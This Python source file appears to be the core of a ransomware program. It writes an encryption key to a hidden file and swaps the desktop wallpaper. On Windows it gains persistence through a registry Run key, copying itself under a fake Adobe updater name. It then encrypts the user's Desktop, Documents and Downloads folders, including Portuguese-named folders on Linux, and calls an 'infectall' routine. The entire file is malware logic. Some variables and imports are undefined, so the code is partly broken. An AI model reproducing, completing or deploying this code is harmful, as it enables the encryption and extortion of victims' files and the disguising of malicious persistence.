from func import Crypt
from func import k
import os
import platform
import shutil
from winreg import *

s = platform.system()

if mc=='Windows':
	try:
		desktop = os.path.expanduser('~/Desktop')
	except:
		pass
	try:
		documents = os.path.expanduser('~/Documents')
	except:
		pass
	try:
		downloads = os.path.expanduser('~/Downloads')
	except:
		pass

	try:
		key = open(documents+'/.officek','wb')
		key.write(k)
		key.close()
	except:
		pass

	try:
		bg = Crypt.resource_path('bg.jpg')
	except:
		pass

	try:
		appdata = os.getenv('APPDATA')
		dest = appdata+"\\Microsoft\\Windows\\Themes"
		shutil.copy(bg,dest+"\\TranscodedWallpaper")
		system("taskkill /f /im explorer.exe")
		system("start C:/Windows/explorer.exe")
	except:
		pass

	keypath = r'SOFTWARE\Microsoft\Windows\CurrentVersion\Run'
	try:
		key = CreateKey(HKEY_LOCAL_MACHINE, keypath)
	except PermissionError:
		key = CreateKey(HKEY_CURRENT_USER, keypath)
	
	try:
		shutil.copy(sys.argv[0],'C:/Users/Public/AdobeAAMUpdater.exe')
		p = 'C:\\Users\\Public\\AdobeAAMUpdater.exe'
		SetValueEx(key, "AdobeAAM", 0, REG_SZ, p)
	except:
		pass

	Crypt.cryptingcommon(desktop)
	Crypt.cryptingcommon(documents)
	Crypt.cryptingcommon(downloads)

	Crypt.infectall()

elif mc=='Linux':
	try:
		desktop = os.path.expanduser('~/Desktop')
	except:
		pass
	try:
		documents = os.path.expanduser('~/Documents')
	except:
		pass
	try:
		downloads = os.path.expanduser('~/Downloads')
	except:
		pass
	try:
		area = os.path.expanduser('~/Área de trabalho')
	except:
		pass
	try:
		documentos = os.path.expanduser('~/Documentos')
	except:
		pass

	try:
		key = open(documents+'/.officek','wb')
		key.write(k)
		key.close()
	except:
		pass
	try:
		key = open(documentos+'/.officek','wb')
		key.write(k)
		key.close()
	except:
		pass

	Crypt.cryptingcommon(desktop)
	Crypt.cryptingcommon(area)
	Crypt.cryptingcommon(documents)
	Crypt.cryptingcommon(documentos)
	Crypt.cryptingcommon(downloads)

	Crypt.infectall()
